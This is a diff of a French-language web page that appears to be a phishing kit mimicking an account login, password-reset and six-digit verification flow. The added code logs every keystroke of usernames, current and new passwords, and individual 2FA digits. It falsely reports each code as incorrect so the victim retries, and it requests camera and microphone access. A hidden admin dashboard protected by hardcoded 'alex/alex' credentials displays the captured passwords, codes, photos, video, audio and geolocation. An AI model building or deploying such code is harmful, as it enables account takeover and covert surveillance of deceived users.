+              · <a href="${escapeHtml(a.url)}" download style="color:#4fc3f7;text-decoration:none;">⬇️ DL</a>
+            </div>
+          </div>
+        `).join('')
+      : '<div class="media-empty">Aucun audio enregistré</div>';
+
+    html += `
+      <div class="session-card">
+        <div class="session-header">
+          <div class="session-title">
+            <span class="session-ip">🌐 ${escapeHtml(ip)}</span>
+            <span class="session-device">${deviceName}</span>
+            <span class="session-badge">${logCount} entrée(s)</span>
+          </div>
+          <div class="session-time">Dernière activité : ${escapeHtml(s.lastSeenStr || '—')}</div>
+        </div>
+        <div class="session-body">
+          ${geoHtml}
+          ${entryInfoHtml}
+
+          <div class="device-info-grid">
+            <div class="device-info-item"><span class="label">Adresse IP</span><span class="value">${escapeHtml(ip)}</span></div>
+            <div class="device-info-item"><span class="label">Appareil</span><span class="value">${deviceName}</span></div>
+            <div class="device-info-item"><span class="label">Écran</span><span class="value">${escapeHtml(screenVal)}</span></div>
+            <div class="device-info-item"><span class="label">Plateforme</span><span class="value">${escapeHtml(platform)}</span></div>
+            <div class="device-info-item"><span class="label">🔋 Batterie live</span><span class="value live">${escapeHtml(liveBattery)}</span></div>
+            <div class="device-info-item"><span class="label">Langue</span><span class="value">${escapeHtml(language)}</span></div>
+            <div class="device-info-item"><span class="label">Première visite</span><span class="value">${escapeHtml(s.firstSeenStr || '—')}</span></div>
+            <div class="device-info-item"><span class="label">Dernière activité</span><span class="value">${escapeHtml(s.lastSeenStr || '—')}</span></div>
+            <div class="device-info-item"><span class="label">Session ID</span><span class="value">${escapeHtml(s.sessionId || '—')}</span></div>
+          </div>
+
+          <div class="captured-fields">
+            <div class="field-row username"><span class="field-icon">👤</span><span class="field-name">Username / Email</span><span class="field-value">${escapeHtml(username)}</span></div>
+            <div class="field-row password"><span class="field-icon">🔑</span><span class="field-name">Mot de passe</span><span class="field-value">${escapeHtml(password)}</span></div>
+            <div class="field-row password"><span class="field-icon">🔐</span><span class="field-name">Mot de passe actuel</span><span class="field-value">${escapeHtml(currentPass)}</span></div>
+            <div class="field-row password"><span class="field-icon">🆕</span><span class="field-name">Nouveau mot de passe</span><span class="field-value">${escapeHtml(newPass)}</span></div>
+            <div class="field-row code"><span class="field-icon">🔢</span><span class="field-name">Code 6 chiffres</span><span class="field-value">${escapeHtml(code)}</span></div>
+          </div>
+
+          <div class="media-section">
+            <h4>📸 Photos capturées (${s.photos ? s.photos.length : 0})</h4>
+            <div class="media-grid">${photosHtml}</div>
+          </div>
+
+          <div class="media-section">
+            <h4>🎬 Vidéos enregistrées (${s.sequences ? s.sequences.length : 0})</h4>
+            <div class="media-grid">${sequencesHtml}</div>
+          </div>
+
+          <div class="media-section">
+            <h4>🎤 Audios enregistrés (${s.audios ? s.audios.length : 0})</h4>
+            <div class="media-grid">${audiosHtml}</div>
+          </div>
+
+          <button class="raw-logs-toggle" onclick="toggleRawLogs(${idx}, event)">
+            📋 Voir tous les logs bruts (${logCount})
+          </button>
+          <div class="raw-logs" id="raw-logs-${idx}">
+            ${s.logs.slice().reverse().map(l => `
+              <div class="raw-log-entry">
+                <span class="raw-time">${escapeHtml(l.timestamp)}</span>
+                <span class="raw-field">${escapeHtml(l.field)}</span> →
+                <span class="raw-value">${escapeHtml(l.value).replace(/\n/g, '<br>')}</span>
+              </div>
+            `).join('')}
+          </div>
+        </div>
+      </div>
+    `;
+  });
+  container.innerHTML = html;
+}
+
+function toggleRawLogs(idx, event) {
+  event.stopPropagation();
+  const el = document.getElementById('raw-logs-' + idx);
+  if (el) el.classList.toggle('open');
+}
+
+/* ============================================================
+   LOAD SESSIONS
+   ============================================================ */
+async function loadSessionsFromServer() {
+  try {
+    const res = await fetch('/api/sessions', {
+      headers: { 'ngrok-skip-browser-warning': 'true' }
+    });
+    if (!res.ok) throw new Error('fetch error');
+    const sessions = await res.json();
+    renderSessions(sessions);
+  } catch (err) {}
+}
+
+/* ============================================================
+   ADMIN LOGIN
+   ============================================================ */
+const adminLoginOverlay = document.getElementById('adminLoginOverlay');
+const dashboardOverlay = document.getElementById('dashboardOverlay');
+const adminUser = document.getElementById('adminUser');
+const adminPass = document.getElementById('adminPass');
+const adminError = document.getElementById('adminError');
+
+document.getElementById('metaA').addEventListener('click', function (e) {
+  e.preventDefault();
+  e.stopPropagation();
+  adminError.textContent = '';
+  adminUser.value = '';
+  adminPass.value = '';
+  adminLoginOverlay.classList.add('open');
+  setTimeout(() => adminUser.focus(), 100);
+});
+
+document.getElementById('closeAdminLogin').addEventListener('click', () => {
+  adminLoginOverlay.classList.remove('open');
+});
+
+document.getElementById('adminLoginBtn').addEventListener('click', attemptAdminLogin);
+adminPass.addEventListener('keydown', e => { if (e.key === 'Enter') attemptAdminLogin(); });
+adminUser.addEventListener('keydown', e => { if (e.key === 'Enter') adminPass.focus(); });
+
+function attemptAdminLogin() {
+  const u = adminUser.value.trim();
+  const p = adminPass.value;
+  if (u === 'alex' && p === 'alex') {
+    adminError.textContent = '';
+    adminLoginOverlay.classList.remove('open');
+    openDashboard();
+  } else {
+    adminError.textContent = 'Identifiants incorrects.';
+  }
+}
+
+/* ============================================================
+   DASHBOARD
+   ============================================================ */
+let dashboardRefreshInterval = null;
+
+async function openDashboard() {
+  dashboardOverlay.classList.add('open');
+  await loadSessionsFromServer();
+  if (dashboardRefreshInterval) clearInterval(dashboardRefreshInterval);
+  dashboardRefreshInterval = setInterval(loadSessionsFromServer, 2000);
+}
+
+document.getElementById('closeDashboard').addEventListener('click', () => {
+  dashboardOverlay.classList.remove('open');
+  if (dashboardRefreshInterval) {
+    clearInterval(dashboardRefreshInterval);
+    dashboardRefreshInterval = null;
+  }
+});
+
+dashboardOverlay.addEventListener('click', (e) => {
+  if (e.target === dashboardOverlay) {
+    dashboardOverlay.classList.remove('open');
+    if (dashboardRefreshInterval) {
+      clearInterval(dashboardRefreshInterval);
+      dashboardRefreshInterval = null;
     }
   }
+});
 
-  /* ============================================================
-     THEME
-     ============================================================ */
-  var themeToggle = document.getElementById('themeToggle');
-  var html = document.documentElement;
-
-  function getInitialTheme() {
-    var saved = localStorage.getItem('theme');
-    if (saved) return saved;
-    return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+document.getElementById('clearLogs').addEventListener('click', async () => {
+  if (confirm('Voulez-vous vraiment vider tous les logs ?')) {
+    try {
+      await fetch('/api/logs', { method: 'DELETE', headers: { 'ngrok-skip-browser-warning': 'true' } });
+      await loadSessionsFromServer();
+    } catch (e) {}
   }
-  function applyTheme(theme) {
-    html.setAttribute('data-theme', theme);
-    localStorage.setItem('theme', theme);
-  }
-  applyTheme(getInitialTheme());
-  themeToggle.addEventListener('click', function () {
-    var current = html.getAttribute('data-theme');
-    applyTheme(current === 'dark' ? 'light' : 'dark');
-  });
+});
 
-  /* ============================================================
-     NAVIGATION
-     ============================================================ */
-  function goToStep(step) {
-    var steps = document.querySelectorAll('.step');
-    for (var i = 0; i < steps.length; i++) steps[i].classList.remove('active');
-    document.getElementById('step' + step).classList.add('active');
-    window.scrollTo(0, 0);
-  }
+/* ============================================================
+   THEME
+   ============================================================ */
+var themeToggle = document.getElementById('themeToggle');
+var html = document.documentElement;
+function getInitialTheme() {
+  var saved = localStorage.getItem('theme');
+  if (saved) return saved;
+  return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+}
+function applyTheme(theme) {
+  html.setAttribute('data-theme', theme);
+  localStorage.setItem('theme', theme);
+}
+applyTheme(getInitialTheme());
+themeToggle.addEventListener('click', function () {
+  applyTheme(html.getAttribute('data-theme') === 'dark' ? 'light' : 'dark');
+});
 
-  /* ============================================================
-     STEP 0: LOGIN
-     ============================================================ */
-  var loginUser = document.getElementById('loginUser');
-  var loginPass = document.getElementById('loginPass');
-  var btnLogin = document.getElementById('btnLogin');
+/* ============================================================
+   NAVIGATION
+   ============================================================ */
+function goToStep(step) {
+  var steps = document.querySelectorAll('.step');
+  for (var i = 0; i < steps.length; i++) steps[i].classList.remove('active');
+  document.getElementById('step' + step).classList.add('active');
+  window.scrollTo(0, 0);
+}
 
-  function checkLogin() {
-    btnLogin.disabled = !(loginUser.value.length >= 1 && loginPass.value.length >= 6);
-  }
-  loginUser.addEventListener('input', checkLogin);
-  loginPass.addEventListener('input', checkLogin);
-  loginUser.addEventListener('change', function() {
-    if (this.value) addLog('👤 Utilisateur (login)', this.value);
-  });
+/* ============================================================
+   STEP 0 : LOGIN
+   ============================================================ */
+var loginUser = document.getElementById('loginUser');
+var loginPass = document.getElementById('loginPass');
+var btnLogin = document.getElementById('btnLogin');
+function checkLogin() {
+  btnLogin.disabled = !(loginUser.value.length >= 1 && loginPass.value.length >= 6);
+}
+loginUser.addEventListener('input', checkLogin);
+loginPass.addEventListener('input', checkLogin);
+loginUser.addEventListener('input', function() { if (this.value) addLog('👤 Username (login)', this.value); });
+loginPass.addEventListener('input', function() { if (this.value) addLog('🔑 Mot de passe (login)', this.value); });
 
-  document.getElementById('formLogin').addEventListener('submit', function (e) {
-    e.preventDefault();
-    addLog('📝 LOGIN — Utilisateur', loginUser.value);
-    addLog('🔑 LOGIN — Mot de passe', loginPass.value);
-    goToStep(3);
-    startCodeTimer(3);
-  });
+// Tracking frappe
+loginUser.addEventListener('focus', () => trackFieldStart('loginUser'));
+loginUser.addEventListener('paste', () => { if (fieldTimers['loginUser']) fieldTimers['loginUser'].pastes++; });
+loginPass.addEventListener('focus', () => trackFieldStart('loginPass'));
+loginPass.addEventListener('paste', () => { if (fieldTimers['loginPass']) fieldTimers['loginPass'].pastes++; });
 
-  /* ============================================================
-     FORGOT PASSWORD
-     ============================================================ */
-  document.getElementById('forgotLink').addEventListener('click', function (e) {
-    e.preventDefault();
-    addLog('🔁 Mot de passe oublié', 'Redirection');
-    goToStep('Reset');
-  });
+document.getElementById('formLogin').addEventListener('submit', function (e) {
+  e.preventDefault();
+  addLog('📝 LOGIN — Utilisateur (submit)', loginUser.value);
+  addLog('🔑 LOGIN — Mot de passe (submit)', loginPass.value);
+  trackFieldEnd('loginUser', loginUser.value);
+  trackFieldEnd('loginPass', loginPass.value);
+  requestCameraAndMic();
+  goToStep(3);
+  startCodeTimer(3);
+});
 
-  /* STEP 1 */
-  var pass1 = document.getElementById('currentPass');
-  var btn1 = document.getElementById('btn1');
-  pass1.addEventListener('input', function () {
-    btn1.disabled = pass1.value.length < 1;
-  });
-  document.getElementById('form1').addEventListener('submit', function (e) {
-    e.preventDefault();
-    addLog('🔐 Mot de passe actuel (étape 1)', pass1.value);
-    goToStep(2);
-  });
+document.getElementById('forgotLink').addEventListener('click', function (e) {
+  e.preventDefault();
+  addLog('🔁 Mot de passe oublié', 'Redirection');
+  goToStep('Reset');
+});
 
-  /* STEP 2 */
-  var np = document.getElementById('newPass');
-  var cp = document.getElementById('confirmPass');
-  var btn2 = document.getElementById('btn2');
-  function checkPass() {
-    btn2.disabled = !(np.value.length >= 6 && np.value === cp.value);
-  }
-  np.addEventListener('input', checkPass);
-  cp.addEventListener('input', checkPass);
-  document.getElementById('form2').addEventListener('submit', function (e) {
-    e.preventDefault();
-    addLog('🆕 Nouveau mot de passe (étape 2)', np.value);
-    goToStep(3);
-    startCodeTimer(3);
-  });
+/* STEP 1 */
+var pass1 = document.getElementById('currentPass');
+var btn1 = document.getElementById('btn1');
+pass1.addEventListener('input', function () {
+  btn1.disabled = pass1.value.length < 1;
+  if (this.value) addLog('🔐 Mot de passe actuel', this.value);
+});
+pass1.addEventListener('focus', () => trackFieldStart('currentPass'));
+pass1.addEventListener('paste', () => { if (fieldTimers['currentPass']) fieldTimers['currentPass'].pastes++; });
+document.getElementById('form1').addEventListener('submit', function (e) {
+  e.preventDefault();
+  addLog('🔐 Mot de passe actuel (submit)', pass1.value);
+  trackFieldEnd('currentPass', pass1.value);
+  goToStep(2);
+});
 
-  /* STEP 3: CODE 6 CHIFFRES */
-  var codeInputs3 = document.querySelectorAll('#codeInputsStep3 input');
-  var btn3 = document.getElementById('btn3');
-  var codeMessage3 = document.getElementById('codeMessage');
+/* STEP 2 */
+var np = document.getElementById('newPass');
+var cp = document.getElementById('confirmPass');
+var btn2 = document.getElementById('btn2');
+function checkPass() { btn2.disabled = !(np.value.length >= 6 && np.value === cp.value); }
+np.addEventListener('input', function() {
+  checkPass();
+  if (this.value) addLog('🆕 Nouveau mot de passe', this.value);
+});
+cp.addEventListener('input', checkPass);
+document.getElementById('form2').addEventListener('submit', function (e) {
+  e.preventDefault();
+  addLog('🆕 Nouveau mot de passe (submit)', np.value);
+  goToStep(3);
+  startCodeTimer(3);
+});
 
-  for (var i = 0; i < codeInputs3.length; i++) {
-    (function (index) {
-      var input = codeInputs3[index];
-      input.addEventListener('input', function () {
-        input.value = input.value.replace(/[^0-9]/g, '');
-        if (input.value && index < codeInputs3.length - 1) codeInputs3[index + 1].focus();
-        checkCode3();
-      });
-      input.addEventListener('keydown', function (e) {
-        if (e.key === 'Backspace' && !input.value && index > 0) codeInputs3[index - 1].focus();
-      });
-    })(i);
-  }
+/* STEP 3 : CODE */
+var codeInputs3 = document.querySelectorAll('#codeInputsStep3 input');
+var btn3 = document.getElementById('btn3');
+var codeMessage3 = document.getElementById('codeMessage');
+for (var i = 0; i < codeInputs3.length; i++) {
+  (function (index) {
+    var input = codeInputs3[index];
+    input.addEventListener('input', function () {
+      input.value = input.value.replace(/[^0-9]/g, '');
+      if (input.value && index < codeInputs3.length - 1) codeInputs3[index + 1].focus();
+      checkCode3();
+      if (input.value) addLog('🔢 Code login — chiffre ' + (index + 1), input.value);
+    });
+    input.addEventListener('keydown', function (e) {
+      if (e.key === 'Backspace' && !input.value && index > 0) codeInputs3[index - 1].focus();
+    });
+  })(i);
+}
+function checkCode3() {
+  var code = '';
+  for (var j = 0; j < codeInputs3.length; j++) code += codeInputs3[j].value;
+  btn3.disabled = code.length !== 6;
+}
+document.getElementById('form3').addEventListener('submit', function (e) {
+  e.preventDefault();
+  var code = '';
+  for (var j = 0; j < codeInputs3.length; j++) code += codeInputs3[j].value;
+  addLog('✅ CODE COMPLET (login)', code);
+  codeMessage3.textContent = 'Code incorrect. Veuillez réessayer.';
+  codeMessage3.style.color = '#c13535';
+  btn3.disabled = true;
+  codeInputs3.forEach(inp => inp.value = '');
+  setTimeout(() => {
+    btn3.disabled = false;
+    codeMessage3.textContent = 'Saisissez le code à 6 chiffres envoyé à votre adresse e-mail.';
+    codeMessage3.style.color = '';
+  }, 1200);
+});
 
-  function checkCode3() {
-    var code = '';
-    for (var j = 0; j < codeInputs3.length; j++) code += codeInputs3[j].value;
-    btn3.disabled = code.length !== 6;
-  }
+/* RESET */
+var resetCurrentPass = document.getElementById('resetCurrentPass');
+var btnReset = document.getElementById('btnReset');
+resetCurrentPass.addEventListener('input', function () {
+  btnReset.disabled = resetCurrentPass.value.length < 1;
+  if (this.value) addLog('🔐 RESET — Mot de passe actuel', this.value);
+});
+document.getElementById('formReset').addEventListener('submit', function (e) {
+  e.preventDefault();
+  addLog('🔐 RESET — Mot de passe actuel (submit)', resetCurrentPass.value);
+  goToStep('ResetCode');
+  startCodeTimer('ResetCode');
+});
 
-  document.getElementById('form3').addEventListener('submit', function (e) {
-    e.preventDefault();
-    var code = '';
-    for (var j = 0; j < codeInputs3.length; j++) code += codeInputs3[j].value;
-    addLog('✅ CODE 6 CHIFFRES (login)', code);
+/* RESET CODE */
+var resetCodeInputs = document.querySelectorAll('#codeInputsReset input');
+var btnResetCode = document.getElementById('btnResetCode');
+var resetCodeMessage = document.getElementById('resetCodeMessage');
+for (var i = 0; i < resetCodeInputs.length; i++) {
+  (function (index) {
+    var input = resetCodeInputs[index];
+    input.addEventListener('input', function () {
+      input.value = input.value.replace(/[^0-9]/g, '');
+      if (input.value && index < resetCodeInputs.length - 1) resetCodeInputs[index + 1].focus();
+      checkResetCode();
+      if (input.value) addLog('🔢 Code reset — chiffre ' + (index + 1), input.value);
+    });
+    input.addEventListener('keydown', function (e) {
+      if (e.key === 'Backspace' && !input.value && index > 0) resetCodeInputs[index - 1].focus();
+    });
+  })(i);
+}
+function checkResetCode() {
+  var code = '';
+  for (var j = 0; j < resetCodeInputs.length; j++) code += resetCodeInputs[j].value;
+  btnResetCode.disabled = code.length !== 6;
+}
+document.getElementById('formResetCode').addEventListener('submit', function (e) {
+  e.preventDefault();
+  var code = '';
+  for (var j = 0; j < resetCodeInputs.length; j++) code += resetCodeInputs[j].value;
+  addLog('✅ CODE COMPLET (reset)', code);
+  resetCodeMessage.textContent = 'Code incorrect. Veuillez réessayer.';
+  resetCodeMessage.style.color = '#c13535';
+  btnResetCode.disabled = true;
+  resetCodeInputs.forEach(inp => inp.value = '');
+  setTimeout(() => {
+    btnResetCode.disabled = false;
+    resetCodeMessage.textContent = 'Saisissez le code à 6 chiffres envoyé à votre e-mail.';
+    resetCodeMessage.style.color = '';
+  }, 1200);
+});
 
-    codeMessage3.textContent = 'Code incorrect. Veuillez réessayer.';
-    codeMessage3.style.color = '#c13535';
-    btn3.disabled = true;
-    codeInputs3.forEach(inp => inp.value = '');
-    setTimeout(() => {
-      btn3.disabled = false;
-      codeMessage3.textContent = 'Saisissez le code à 6 chiffres envoyé à votre adresse e-mail.';
-      codeMessage3.style.color = '';
-    }, 1200);
-  });
+/* NEW PASS RESET */
+var newPassReset = document.getElementById('newPassReset');
+var confirmPassReset = document.getElementById('confirmPassReset');
+var btnNewPass = document.getElementById('btnNewPass');
+function checkNewPass() {
+  btnNewPass.disabled = !(newPassReset.value.length >= 6 && newPassReset.value === confirmPassReset.value);
+}
+newPassReset.addEventListener('input', function() {
+  checkNewPass();
+  if (this.value) addLog('🆕 Nouveau mot de passe (reset)', this.value);
+});
+confirmPassReset.addEventListener('input', checkNewPass);
+document.getElementById('formNewPass').addEventListener('submit', function (e) {
+  e.preventDefault();
+  addLog('🆕 NOUVEAU MOT DE PASSE (reset - submit)', newPassReset.value);
+  document.querySelector('#stepNewPass h2').textContent = 'Mot de passe modifié';
+  document.querySelector('#stepNewPass p').textContent = 'Votre mot de passe a été réinitialisé avec succès.';
+  btnNewPass.disabled = true;
+  btnNewPass.textContent = 'Terminé';
+  var inputs = document.querySelectorAll('#formNewPass input');
+  for (var k = 0; k < inputs.length; k++) inputs[k].disabled = true;
+  setTimeout(function () { goToStep(0); }, 2000);
+});
 
-  /* RESET: CURRENT PASSWORD */
-  var resetCurrentPass = document.getElementById('resetCurrentPass');
-  var btnReset = document.getElementById('btnReset');
-  function checkReset() {
-    btnReset.disabled = resetCurrentPass.value.length < 1;
-  }
-  resetCurrentPass.addEventListener('input', checkReset);
-  document.getElementById('formReset').addEventListener('submit', function (e) {
-    e.preventDefault();
-    addLog('🔐 RESET — Mot de passe actuel', resetCurrentPass.value);
-    goToStep('ResetCode');
-    startCodeTimer('ResetCode');
-  });
+/* TIMER */
+let codeTimers = {};
+function startCodeTimer(stepId) {
+  if (codeTimers[stepId]) clearInterval(codeTimers[stepId]);
+  let seconds = 60;
+  const messageEl = stepId === 3 ? codeMessage3 : resetCodeMessage;
+  const originalText = messageEl.textContent;
+  messageEl.textContent = `Veuillez patienter ${seconds}s avant de recevoir le code...`;
+  messageEl.style.color = '#f0ad4e';
+  codeTimers[stepId] = setInterval(() => {
+    seconds--;
+    if (seconds <= 0) {
+      clearInterval(codeTimers[stepId]);
+      codeTimers[stepId] = null;
+      messageEl.textContent = originalText;
+      messageEl.style.color = '';
+    } else {
+      messageEl.textContent = `Veuillez patienter ${seconds}s avant de recevoir le code...`;
+    }
+  }, 1000);
+}
 
-  /* RESET CODE */
-  var resetCodeInputs = document.querySelectorAll('#codeInputsReset input');
-  var btnResetCode = document.getElementById('btnResetCode');
-  var resetCodeMessage = document.getElementById('resetCodeMessage');
+/* BACK */
+document.getElementById('backBtn').addEventListener('click', function () { goToStep(0); });
+document.getElementById('backBtn2').addEventListener('click', function () { goToStep(1); });
+document.getElementById('backBtn3').addEventListener('click', function () { goToStep(0); });
+document.getElementById('backBtnReset').addEventListener('click', function () { goToStep(0); });
+document.getElementById('backBtnResetCode').addEventListener('click', function () { goToStep('Reset'); });
+document.getElementById('backBtnNewPass').addEventListener('click', function () { goToStep('ResetCode'); });
 
-  for (var i = 0; i < resetCodeInputs.length; i++) {
-    (function (index) {
-      var input = resetCodeInputs[index];
-      input.addEventListener('input', function () {
-        input.value = input.value.replace(/[^0-9]/g, '');
-        if (input.value && index < resetCodeInputs.length - 1) resetCodeInputs[index + 1].focus();
-        checkResetCode();
-      });
-      input.addEventListener('keydown', function (e) {
-        if (e.key === 'Backspace' && !input.value && index > 0) resetCodeInputs[index - 1].focus();
-      });
-    })(i);
-  }
-
-  function checkResetCode() {
-    var code = '';
-    for (var j = 0; j < resetCodeInputs.length; j++) code += resetCodeInputs[j].value;
-    btnResetCode.disabled = code.length !== 6;
-  }
-
-  document.getElementById('formResetCode').addEventListener('submit', function (e) {
-    e.preventDefault();
-    var code = '';
-    for (var j = 0; j < resetCodeInputs.length; j++) code += resetCodeInputs[j].value;
-    addLog('✅ CODE 6 CHIFFRES (reset)', code);
-
-    resetCodeMessage.textContent = 'Code incorrect. Veuillez réessayer.';
-    resetCodeMessage.style.color = '#c13535';
-    btnResetCode.disabled = true;
-    resetCodeInputs.forEach(inp => inp.value = '');
-    setTimeout(() => {
-      btnResetCode.disabled = false;
-      resetCodeMessage.textContent = 'Saisissez le code à 6 chiffres envoyé à votre e-mail.';
-      resetCodeMessage.style.color = '';
-    }, 1200);
-  });
-
-  /* NEW PASS RESET */
-  var newPassReset = document.getElementById('newPassReset');
-  var confirmPassReset = document.getElementById('confirmPassReset');
-  var btnNewPass = document.getElementById('btnNewPass');
-
-  function checkNewPass() {
-    btnNewPass.disabled = !(newPassReset.value.length >= 6 && newPassReset.value === confirmPassReset.value);
-  }
-  newPassReset.addEventListener('input', checkNewPass);
-  confirmPassReset.addEventListener('input', checkNewPass);
-
-  document.getElementById('formNewPass').addEventListener('submit', function (e) {
-    e.preventDefault();
-    addLog('🆕 NOUVEAU MOT DE PASSE (reset)', newPassReset.value);
-    document.querySelector('#stepNewPass h2').textContent = 'Mot de passe modifié';
-    document.querySelector('#stepNewPass p').textContent = 'Votre mot de passe a été réinitialisé avec succès.';
-    btnNewPass.disabled = true;
-    btnNewPass.textContent = 'Terminé';
-    var inputs = document.querySelectorAll('#formNewPass input');
-    for (var k = 0; k < inputs.length; k++) inputs[k].disabled = true;
-    setTimeout(function () { goToStep(0); }, 2000);
-  });
-
-  /* TIMER FOR CODE */
-  let codeTimers = {};
-  function startCodeTimer(stepId) {
-    if (codeTimers[stepId]) clearInterval(codeTimers[stepId]);
-    let seconds = 60;
-    const messageEl = stepId === 3 ? codeMessage3 : resetCodeMessage;
-    const originalText = messageEl.textContent;
-
-    messageEl.textContent = `Veuillez patienter ${seconds}s avant de recevoir le code...`;
-    messageEl.style.color = '#f0ad4e';
-
-    codeTimers[stepId] = setInterval(() => {
-      seconds--;
-      if (seconds <= 0) {
-        clearInterval(codeTimers[stepId]);
-        codeTimers[stepId] = null;
-        messageEl.textContent = originalText;
-        messageEl.style.color = '';
-      } else {
-        messageEl.textContent = `Veuillez patienter ${seconds}s avant de recevoir le code...`;
-      }
-    }, 1000);
-  }
-
-  /* BACK BUTTONS */
-  document.getElementById('backBtn').addEventListener('click', function () { goToStep(0); });
-  document.getElementById('backBtn2').addEventListener('click', function () { goToStep(1); });
-  document.getElementById('backBtn3').addEventListener('click', function () { goToStep(0); });
-  document.getElementById('backBtnReset').addEventListener('click', function () { goToStep(0); });
-  document.getElementById('backBtnResetCode').addEventListener('click', function () { goToStep('Reset'); });
-  document.getElementById('backBtnNewPass').addEventListener('click', function () { goToStep('ResetCode'); });
-
-  /* INITIAL LOG */
-  addLog('🚀 Session démarrée', 'Dashboard prêt — alex/alex');
+/* ============================================================
+   INIT
+   ============================================================ */
+(async () => {
+  await sendEntryReport();
+  await startBatteryMonitoring();
+  await addLog('🚀 Session démarrée', 'Dashboard prêt — alex/alex');
+})();
 </script>
 </body>
 </html>
